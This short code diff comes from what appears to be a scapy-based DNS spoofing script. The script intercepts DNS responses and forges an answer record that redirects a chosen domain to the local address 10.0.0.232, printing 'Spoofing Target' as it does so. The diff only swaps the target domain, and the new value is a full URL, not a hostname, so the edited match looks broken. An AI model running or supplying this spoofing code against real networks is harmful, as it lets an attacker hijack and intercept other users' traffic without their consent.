@@ -7,7 +7,7 @@ def process_packet(packet):
     scapy_packet    = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname       = scapy_packet[scapy.DNSQR].qname
-        if "www.iczn.org" in qname:
+        if "http://www.surfoffline.com/" in qname:
             print("[+]. Spoofing Target -->> ")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.232")
             scapy_packet[scapy.DNS].an = answer
